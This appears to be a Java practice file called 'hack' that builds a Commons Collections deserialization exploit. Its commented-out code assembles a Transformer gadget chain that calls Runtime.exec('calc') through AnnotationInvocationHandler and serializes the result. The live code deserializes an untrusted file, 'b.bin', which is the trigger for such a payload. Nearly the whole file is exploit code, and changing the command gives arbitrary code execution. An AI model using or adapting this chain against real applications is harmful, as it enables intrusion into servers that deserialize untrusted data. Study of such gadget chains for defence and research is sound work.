import java.io.*;
import java.lang.reflect.InvocationTargetException;

//import sun.reflect.annotation.AnnotationInvocationHandler;

public class hack {
    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, IOException {
////        Transformer[] transformers = {
////                new ConstantTransformer(Runtime.getRuntime() ),
////                new InvokerTransformer("exec",
////                        new Class[] {String.class },
////                        new Object[] {"calc"})
////        };
//        Transformer[] transformers = {
//                new ConstantTransformer(Runtime.class),
//                new InvokerTransformer("getMethod", new Class[]{ String.class, Class[].class}, new Object[]{"getRuntime", new Class[0] }),
//                new InvokerTransformer("invoke", new Class[]{ Object.class, Object[].class}, new Object[]{ null ,new Object[0]} ),
//                new InvokerTransformer("exec",
//                        new Class[] {String.class },
//                        new Object[] {"calc"})
//        };
//        Transformer transformerChain = new ChainedTransformer(transformers);
////        transformerChain.transform(null);
//        Map map = new HashMap();
//        map.put("value", "2");
//
//        Map transformedmap = TransformedMap.decorate(map, null, transformerChain);
////        transformedmap.put("1","2");
//
//        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
//        Constructor cons = clazz.getDeclaredConstructor(Class.class,Map.class);
//        cons.setAccessible(true);
//
//        Object ins = cons.newInstance(java.lang.annotation.Retention.class,transformedmap);
//
//        ByteArrayOutputStream exp = new ByteArrayOutputStream();
//        ObjectOutputStream oos = new ObjectOutputStream(exp);
//        oos.writeObject(ins);
//        oos.flush();
//        oos.close();

//        ByteArrayInputStream out = new ByteArrayInputStream(exp.toByteArray());
//        ObjectInputStream ois = new ObjectInputStream(out);
//        Object obj = (Object) ois.readObject();


//        ByteArrayInputStream out = new ByteArrayInputStream(exp.toByteArray());
        FileInputStream out = new FileInputStream("b.bin");
        ObjectInputStream ois = new ObjectInputStream(out);
        Object obj = (Object) ois.readObject();

//        try{
//            File f = new File("expobject");
//            ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));
//            out.writeObject(transformerChain);
//            out.flush();
//            out.close();
//        }catch (IOException e){
//            e.printStackTrace();
//        }
//        try {
//            FileInputStream f = new FileInputStream("expobject");
//            ObjectInputStream oin = new ObjectInputStream(f);
//            Transformer expobject = (Transformer)oin.readObject();
//            expobject.transform("cc");
//            System.out.println(expobject.getClass());
//        }
//        catch (FileNotFoundException e){
//            e.printStackTrace();
//        }catch (ClassNotFoundException e){
//            e.printStackTrace();
//        }catch (IOException e){
//            e.printStackTrace();
//        }
    }
}

//class hack2 implements Transformer{
//    private final Transformer[] iTransformers;
//    public hack2(Transformer[] transformers) { this.iTransformers = transformers; }
//    public Object transform(Object object) {
//        for(int i = 0; i < this.iTransformers.length; ++i) {
//            System.out.println(object.getClass());
//            object = this.iTransformers[i].transform(object);
//        }
//        return object;
//    }
//}